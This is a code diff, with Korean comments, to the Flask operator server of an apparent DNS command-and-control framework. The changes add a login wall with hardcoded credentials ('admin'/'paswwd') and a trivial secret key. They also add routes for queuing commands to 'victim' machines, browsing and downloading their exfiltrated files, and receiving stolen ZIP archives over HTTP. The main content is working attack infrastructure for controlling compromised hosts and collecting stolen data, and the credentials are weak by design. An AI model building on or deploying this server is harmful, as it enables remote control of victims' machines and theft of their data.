@@ -1,31 +1,49 @@
-# /root/dns-c2/server/flask_api_v7.py (기존 flask.api_v6.py에서 수정됨)
+# /root/dns-c2/server/flask_api_v8.py (로그인 기능 추가 버전)
+# /root/dns-c2/server/flask_api_v9.py (로그인 기능 추가 버전)
 
 import json
 import os
 import uuid
 import shutil
 from datetime import datetime, timezone
-from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory # render_template 추가
+# --- [수정] session, flash, wraps 추가 ---
+from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory, session, flash
+from functools import wraps
+# ------------------------------------
 import logging
 import hashlib
-import base64 # view_command_result_page, browse_folder_item 에서 사용되므로 추가
+import base64
 import glob
 import requests
 
 app = Flask(__name__)
+
+# --- [추가] 세션 암호화를 위한 시크릿 키 설정 ---
+# 경고: 실제 운영 환경에서는 반드시 예측 불가능한 복잡한 문자열로 변경하세요!
+app.secret_key = 'ccit'
 
 # Configuration
 BASE_DIR = "/root/dns-c2/"
 COMMAND_QUEUE_FILE = os.path.join(BASE_DIR, "server", "command_queue.json")
 VICTIM_METADATA_FILE = os.path.join(BASE_DIR, "server", "victim_metadata.json") # 추가
 RESULTS_DIR = os.path.join(BASE_DIR, "logs", "results")
-API_PORT = 5000
+API_PORT = 80
 ONLINE_THRESHOLD_SECONDS = 300
 RESTORED_ZIPS_DIR = os.path.abspath(os.path.join(BASE_DIR, "analyzer", "restored_zips"))
-
+HTTP_EXFIL_DIR = os.path.join(BASE_DIR, "exfiltrated_files_http")
 
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# --- [추가] 로그인 데코레이터 ---
+def login_required(f):
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        if 'logged_in' not in session:
+            return redirect(url_for('login', next=request.url))
+        return f(*args, **kwargs)
+    return decorated_function
+
 
 # --- Command Queue Functions (기존과 거의 동일, 에러 로깅 강화) ---
 def load_command_queue():
@@ -152,7 +170,32 @@ def get_victim_hashed_id(victim_uuid):
     return hashlib.sha1(victim_uuid.encode()).hexdigest()[:6]
 
 # --- Routes ---
+
+# --- [추가] 로그인 및 로그아웃 라우트 ---
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    error = None
+    if request.method == 'POST':
+        # 경고: 실제 운영 환경에서는 비밀번호를 해시하여 안전하게 비교해야 합니다.
+        if request.form['username'] == 'admin' and request.form['password'] == 'paswwd':
+            session['logged_in'] = True
+            flash('You were successfully logged in')
+            next_url = request.args.get('next')
+            return redirect(next_url or url_for('index'))
+        else:
+            error = 'Invalid Credentials. Please try again.'
+    return render_template('login.html', error=error)
+
+@app.route('/logout')
+@login_required # 로그아웃도 로그인된 상태에서만 가능
+def logout():
+    session.pop('logged_in', None)
+    flash('You were logged out')
+    return redirect(url_for('login'))
+
+
 @app.route('/', methods=['GET'])
+@login_required
 def index():
     logging.info("--- index route CALLED ---") # 함수 시작 로깅
     victims_data = []
@@ -216,8 +259,31 @@ def index():
         # 비상 반환 (실제로는 Flask의 500 오류 페이지가 더 적절하지만, None 반환을 막기 위함)
         return "An unexpected error occurred in the index route. Please check server logs.", 500
 
+# --- [추가] HTTP로 유출된 ZIP 파일을 다운로드하는 라우트 ---
+@app.route('/download/http_exfil/<victim_hash>/<filename>')
+@login_required # <-- 로그인 필수!
+def download_http_exfil_file(victim_hash, filename):
+    logging.info(f"Attempting to serve HTTP exfil file: {filename} for victim {victim_hash}")
+    
+    # 경로 조작 방지
+    if not filename.startswith(f"victim_{victim_hash}_"):
+         return render_template('error.html', message="Access denied or invalid filename."), 403
+
+    try:
+        return send_from_directory(
+            HTTP_EXFIL_DIR,
+            filename,
+            as_attachment=True
+        )
+    except FileNotFoundError:
+        logging.error(f"HTTP exfil file not found: {os.path.join(HTTP_EXFIL_DIR, filename)}")
+        return render_template('error.html', message=f"File '{filename}' not found."), 404
+    except Exception as e:
+        logging.error(f"Error serving HTTP exfil file '{filename}': {e}", exc_info=True)
+        return render_template('error.html', message="An error occurred while serving the file."), 500
 
 @app.route('/download/exfil/<victim_hash>/<session_name>')
+@login_required
 def download_restored_exfil_file(victim_hash, session_name):
     """rebuild_zip.py가 생성한 파일을 다운로드합니다."""
     if not victim_hash or not session_name:
@@ -246,7 +312,9 @@ def download_restored_exfil_file(victim_hash, session_name):
         logging.error(f"Error serving restored file '{filename}': {e}", exc_info=True)
         return render_template('error.html', message=f"An error occurred while serving the file: {e}"), 500
 
+
 @app.route('/queue_command', methods=['POST'])
+@login_required
 def queue_command_route():
     victim_id_form = request.form.get('victim_id', '').strip() # API는 victim_hash를 사용하지만, 폼에서는 victim_id로 받음
     command_string = request.form.get('command_string', '').strip()
@@ -271,44 +339,52 @@ def queue_command_route():
     logging.info(f"Queued command ID {new_command['command_id']} for victim_hash '{victim_id_form}': {command_string}")
     return redirect(url_for('index'))
 
+
 @app.route('/victim/<victim_hash>', methods=['GET'])
+@login_required
 def view_victim_details(victim_hash):
+    # 1. DNS 채널 세션 정보
+    dns_sessions = []
     victim_path_full = os.path.join(RESULTS_DIR, victim_hash)
-    sessions_info = []
     if os.path.isdir(victim_path_full):
         try:
-            session_dirs = [d for d in os.listdir(victim_path_full) if os.path.isdir(os.path.join(victim_path_full, d))]
-            for sess_name in sorted(session_dirs, reverse=True):
+            for sess_name in sorted([d for d in os.listdir(victim_path_full) if os.path.isdir(os.path.join(victim_path_full, d))], reverse=True):
                 session_path_abs = os.path.join(victim_path_full, sess_name)
-                
-                # 수정: 'exfil_data' 폴더 대신 'chunk*.b64' 파일 존재 여부 확인
-                exfil_chunks_exist = len(glob.glob(os.path.join(session_path_abs, "chunk*.b64"))) > 0
-                
-                session_item = {
+                dns_sessions.append({
                     "name": sess_name,
-                    "has_exfil": exfil_chunks_exist, # 수정된 플래그 사용
+                    "has_exfil": len(glob.glob(os.path.join(session_path_abs, "chunk*.b64"))) > 0,
                     "has_dns_cmd": os.path.isdir(os.path.join(session_path_abs, "cmd_results")),
                     "has_http_cmd": os.path.isdir(os.path.join(session_path_abs, "http_cmd_results"))
-                }
-                sessions_info.append(session_item)
+                })
         except OSError as e:
-            # ... (기존 에러 처리) ...
-            return render_template('error.html', message=f"Error reading data for victim {victim_hash}"), 500
+            logging.error(f"Error reading DNS session for {victim_hash}: {e}")
     
-    # ... (나머지 부분은 동일) ...
-    metadata = load_victim_metadata().get(victim_hash, {})
-    first_seen = metadata.get('first_seen', 'Unknown')
-    last_seen = metadata.get('last_seen', 'Unknown')
-    system_info_for_template = metadata.get('system_info', {})
+    # 2. HTTP 채널 유출 파일 정보
+    http_exfil_files = []
+    if os.path.isdir(HTTP_EXFIL_DIR):
+        try:
+            for f_path in glob.glob(os.path.join(HTTP_EXFIL_DIR, f"victim_{victim_hash}_*.zip")):
+                filename = os.path.basename(f_path)
+                http_exfil_files.append({
+                    "filename": filename,
+                    "display_name": filename.replace(f"victim_{victim_hash}_", "").replace(".zip", "")
+                })
+        except Exception as e:
+            logging.error(f"Error scanning HTTP exfil files for {victim_hash}: {e}")
 
+    # 3. 메타데이터 및 렌더링
+    metadata = load_victim_metadata().get(victim_hash, {})
     return render_template('victim_details.html', 
                            victim_hash=victim_hash, 
-                           sessions_info=sessions_info,
-                           first_seen=first_seen,
-                           last_seen=last_seen,
-                           system_info=system_info_for_template)
+                           dns_sessions=dns_sessions,
+                           http_exfil_files=http_exfil_files,
+                           first_seen=metadata.get('first_seen', 'Unknown'),
+                           last_seen=metadata.get('last_seen', 'Unknown'),
+                           system_info=metadata.get('system_info', {}))
+
 
 @app.route('/browse/<victim_hash>/<session_name>/<path:sub_folder>') # sub_folder가 여러 depth를 가질 수 있도록 path 타입 사용
+@login_required
 def browse_folder(victim_hash, session_name, sub_folder):
     # sub_folder 경로 조작 방지 강화
     base_victim_session_path = os.path.normpath(os.path.join(RESULTS_DIR, victim_hash, session_name))
@@ -357,7 +433,9 @@ def browse_folder(victim_hash, session_name, sub_folder):
                            parent_folder_link=parent_folder_link)
 
 
+
 @app.route('/browse/<victim_hash>/<session_name>/<path:sub_folder>/<item_name>') # item_name도 path로 변경하지 않음. 파일 이름이니까.
+@login_required
 def browse_folder_item(victim_hash, session_name, sub_folder, item_name):
     base_victim_session_path = os.path.normpath(os.path.join(RESULTS_DIR, victim_hash, session_name))
     file_path = os.path.normpath(os.path.join(base_victim_session_path, sub_folder, item_name))
@@ -426,6 +504,7 @@ def browse_folder_item(victim_hash, session_name, sub_folder, item_name):
 
 
 @app.route('/command_result/<victim_hash>/<command_id>', methods=['GET'])
+@login_required
 def view_command_result_page(victim_hash, command_id):
     queue = load_command_queue()
     target_command = next((cmd for cmd in queue if cmd.get('command_id') == command_id and cmd.get('victim_hash') == victim_hash), None)
@@ -491,6 +570,7 @@ def view_command_result_page(victim_hash, command_id):
 
 
 @app.route('/delete_command/<command_id>', methods=['POST'])
+@login_required
 def delete_command(command_id): # 함수명과 인자를 라우트에 맞게 수정
     """ID에 해당하는 명령어를 큐에서 삭제합니다."""
     if not command_id:
@@ -510,8 +590,10 @@ def delete_command(command_id): # 함수명과 인자를 라우트에 맞게 수
         logging.warning(f"Command ID {command_id} not found in queue for deletion.")
     return redirect(url_for('index'))
 
+
 # --- 새로운 delete_victim 함수 추가 ---
 @app.route('/delete_victim/<victim_hash>', methods=['POST'])
+@login_required
 def delete_victim(victim_hash):
     """지정된 Victim의 모든 데이터(메타데이터, 결과 폴더, 관련 명령어)를 삭제합니다."""
     if not victim_hash:
@@ -710,6 +792,41 @@ def submit_client_result(victim_uuid_full):
 
     return jsonify({"status": "success"})
 
+# --- [추가] FastAPI로부터 HTTP 유출 ZIP 파일을 수신하는 API ---
+@app.route('/api/upload/http_exfil', methods=['POST'])
+def upload_http_exfiltrated_zip():
+    logging.info("API: Request received on /api/upload/http_exfil")
+
+    if 'file' not in request.files:
+        return jsonify({"status": "error", "message": "File part is missing"}), 400
+
+    victim_hash = request.form.get('victim_hash')
+    session_name = request.form.get('session_name')
+    file = request.files['file']
+
+    if not victim_hash or not session_name or not file.filename:
+        return jsonify({"status": "error", "message": "Missing form data"}), 400
+
+    # --- [개선 사항] 파일 수신 시점에도 Last Seen을 업데이트 ---
+    update_victim_last_seen(victim_hash)
+    logging.info(f"Updated last_seen for victim {victim_hash} via HTTP exfil.")
+    # --------------------------------------------------------
+
+    safe_victim_hash = ''.join(c for c in victim_hash if c.isalnum() or c in ('_'))
+    safe_session_name = ''.join(c for c in session_name if c.isalnum() or c in ('_'))
+    
+    filename = f"victim_{safe_victim_hash}_{safe_session_name}.zip"
+    
+    os.makedirs(HTTP_EXFIL_DIR, exist_ok=True)
+    save_path = os.path.join(HTTP_EXFIL_DIR, filename)
+
+    try:
+        file.save(save_path)
+        logging.info(f"API http_exfil: Successfully saved file to {save_path}")
+        return jsonify({"status": "success", "message": f"File saved to {save_path}"}), 200
+    except Exception as e:
+        logging.error(f"API http_exfil: Failed to save file. Error: {e}", exc_info=True)
+        return jsonify({"status": "error", "message": "Could not save file"}), 500
 if __name__ == '__main__':
     # 애플리케이션 시작 시 파일들 초기화
     if not os.path.exists(COMMAND_QUEUE_FILE):
@@ -719,4 +836,4 @@ if __name__ == '__main__':
         logging.info(f"Victim metadata file {VICTIM_METADATA_FILE} not found, creating empty metadata.")
         save_victim_metadata({})
         
-    app.run(host='0.0.0.0', port=API_PORT, debug=True)
+    app.run(host='0.0.0.0', port=API_PORT, debug=False)
